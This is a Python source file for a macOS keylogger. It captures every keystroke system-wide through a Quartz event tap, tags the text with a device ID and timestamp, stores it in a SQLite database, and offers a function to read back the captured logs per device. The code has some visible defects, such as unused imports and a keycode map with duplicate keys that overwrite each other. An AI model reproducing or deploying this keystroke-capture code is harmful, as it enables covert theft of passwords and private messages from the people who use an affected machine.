import sys
import threading
import time
from datetime import datetime
import os
import sqlite3
import logging

# macOS-specific imports, wrapped in try-except
try:
    from Quartz import (
        CGEventTapCreate,
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        CGEventMaskBit,
        kCGEventKeyDown,
        CGEventTapEnable,
        CFMachPortCreateRunLoopSource,
        CFRunLoopGetCurrent,
        CFRunLoopAddSource,
        kCFRunLoopCommonModes,
        CGEventGetIntegerValueField,
        kCGKeyboardEventKeycode,
        CFRunLoopRun,
        NSEvent
    )
except ImportError:
    # On non-macOS systems, these will be None
    pass

import platform
import psutil
import socket
from pynput import keyboard

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

class KeyLogger:
    def __init__(self, db_path):
        self.db_path = db_path
        self.key_buffer = []
        self.buffer_lock = threading.Lock()
        self.running = False
        self.current_minute = None
        self.device_id = None
        self.tap = None
        self.run_loop_thread = None
        self.last_write = time.time()
        
        # Initialize DB
        self.init_db()

    def get_timestamp(self):
        return datetime.now().strftime("%Y-%m-%d %H:%M")

    def init_db(self):
        try:
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS keystrokes
                        (id INTEGER PRIMARY KEY AUTOINCREMENT,
                         device_id TEXT NOT NULL,
                         timestamp TEXT NOT NULL,
                         content TEXT NOT NULL)''')
            conn.commit()
            conn.close()
            logger.debug("Database initialized successfully")
        except Exception as e:
            logger.error(f"Error initializing database: {e}")
            raise

    def write_to_db(self):
        while self.running:
            time.sleep(15)  # Wait longer between checks
            current_time = time.time()
            with self.buffer_lock:
                if self.key_buffer and (current_time - self.last_write >= 2.0 or len(self.key_buffer) > 100):
                    try:
                        content = ''.join(self.key_buffer)
                        timestamp = self.get_timestamp()
                        
                        if content.strip():
                            logger.debug(f"Attempting to write to DB: {content}")
                            conn = sqlite3.connect(self.db_path)
                            c = conn.cursor()
                            c.execute("INSERT INTO keystrokes (device_id, timestamp, content) VALUES (?, ?, ?)",
                                    (self.device_id, timestamp, content))
                            conn.commit()
                            conn.close()
                            
                            logger.debug(f"Successfully wrote to DB: {timestamp} - {content}")
                        
                        self.key_buffer.clear()
                        self.last_write = current_time
                    except Exception as e:
                        logger.error(f"Error writing to DB: {e}")

    def get_logs(self, device_id=None):
        try:
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            
            logger.debug("Attempting to fetch logs from DB")
            
            if device_id:
                logger.debug(f"Fetching logs for device: {device_id}")
                c.execute("SELECT timestamp, device_id, content FROM keystrokes WHERE device_id = ? ORDER BY timestamp DESC", (device_id,))
            else:
                logger.debug("Fetching all logs")
                c.execute("SELECT timestamp, device_id, content FROM keystrokes ORDER BY timestamp DESC")
                
            rows = c.fetchall()
            conn.close()
            
            logger.debug(f"Found {len(rows)} log entries")
            
            # Convert rows to array of formatted strings
            result = []
            for timestamp, dev_id, content in rows:
                log_entry = f"[{timestamp}] Device-{dev_id}: {content}"
                result.append(log_entry)
                logger.debug(f"Log entry: {log_entry}")
            
            logger.debug(f"Final result array: {result}")
            return result  # Return array directly instead of joining with newlines
            
        except Exception as e:
            logger.error(f"Error getting logs: {e}")
            return []  # Return empty array on error

    def handle_event(self, proxy, type_, event, refcon):
        try:
            if not self.running:
                return event

            # Convert CGEvent to NSEvent to get the actual characters
            ns_event = NSEvent.eventWithCGEvent_(event)
            if ns_event:
                chars = ns_event.characters()
                if chars:
                    with self.buffer_lock:
                        self.key_buffer.append(chars)
                        logger.debug(f"Key pressed: {chars}")
                        logger.debug(f"Current buffer: {''.join(self.key_buffer)}")

            return event
        except Exception as e:
            logger.error(f"Error in handle_event: {e}")
            return event

    def keycode_to_char(self, keycode):
        # Basic mapping of common keycodes to characters
        keymap = {
            0: 'a', 1: 's', 2: 'd', 3: 'f', 4: 'h', 5: 'g', 6: 'z', 7: 'x',
            8: 'c', 9: 'v', 11: 'b', 12: 'q', 13: 'w', 14: 'e', 15: 'r',
            16: 'y', 17: 't', 32: 'u', 34: 'i', 31: 'o', 35: 'p',
            49: ' ',  # space
            # Hebrew characters
            7: 'ז', 23: 'ק', 22: 'ר', 26: 'א', 28: 'ט', 25: 'ו', 29: 'ן', 
            27: 'י', 24: 'ע', 21: 'פ', 20: 'ש', 19: 'ד', 18: 'ג', 
            17: 'כ', 16: 'ע', 15: 'י', 14: 'ח', 13: 'ל', 12: 'ך', 
            11: 'ף', 10: 'ם', 9: 'פ', 8: 'צ', 7: 'ת', 6: 'ץ', 5: 'מ',
            4: 'נ', 3: 'ה', 2: 'ב', 1: 'ס', 0: 'ש'
        }
        return keymap.get(keycode)

    def start_logging(self, device_id):
        if self.running:
            return "Keylogger is already running"

        try:
            self.device_id = device_id
            self.running = True
            
            # Create event tap
            self.tap = CGEventTapCreate(
                kCGSessionEventTap,
                kCGHeadInsertEventTap,
                0,
                CGEventMaskBit(kCGEventKeyDown),
                self.handle_event,
                None
            )
            
            if self.tap:
                # Start writer thread
                self.writer_thread = threading.Thread(target=self.write_to_db)
                self.writer_thread.daemon = True
                self.writer_thread.start()
                
                # Start run loop in a separate thread
                def run_loop():
                    run_loop_source = CFMachPortCreateRunLoopSource(None, self.tap, 0)
                    CFRunLoopAddSource(CFRunLoopGetCurrent(), run_loop_source, kCFRunLoopCommonModes)
                    CGEventTapEnable(self.tap, True)
                    CFRunLoopRun()  # This will keep running and capturing events
                
                self.run_loop_thread = threading.Thread(target=run_loop)
                self.run_loop_thread.daemon = True
                self.run_loop_thread.start()
                
                logger.debug(f"Started logging for device {device_id}")
                return "Keylogger started successfully"
            else:
                self.running = False
                return "Failed to create event tap"
                
        except Exception as e:
            self.running = False
            logger.error(f"Error starting keylogger: {e}")
            return f"Error starting keylogger: {str(e)}"

    def stop_logging(self):
        if not self.running:
            return "Keylogger is not running"

        try:
            self.running = False
            if self.tap:
                CGEventTapEnable(self.tap, False)
            # Force write any remaining buffer
            with self.buffer_lock:
                if self.key_buffer:
                    content = ''.join(self.key_buffer)
                    timestamp = self.get_timestamp()
                    conn = sqlite3.connect(self.db_path)
                    c = conn.cursor()
                    c.execute("INSERT INTO keystrokes (device_id, timestamp, content) VALUES (?, ?, ?)",
                            (self.device_id, timestamp, content))
                    conn.commit()
                    conn.close()
            return "Keylogger stopped successfully"
        except Exception as e:
            logger.error(f"Error stopping keylogger: {e}")
            return f"Error stopping keylogger: {str(e)}"

if __name__ == "__main__":
    # Path for text to be collected
    path = "/Users/mordechaywolff/Desktop/קודקוד/Python/KeyLogger/log.txt"
    keylogger = KeyLogger(path)
    print(keylogger.start_logging("Device-1")) 